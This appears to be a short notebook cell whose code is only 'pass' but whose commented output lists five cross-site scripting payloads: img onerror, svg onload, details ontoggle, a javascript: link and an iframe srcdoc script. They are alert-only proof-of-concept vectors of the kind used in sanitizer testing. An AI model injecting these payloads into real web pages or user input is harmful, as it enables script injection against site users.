# %%
pass
# Out:
# <img src=x onerror=alert(document.domain)>
# <svg onload=alert(1)>
# <details open ontoggle=alert(2)>test</details>
# <a href=javascript:alert(3)>click</a>
# <iframe srcdoc="&lt;script&gt;alert(4)&lt;/script&gt;">
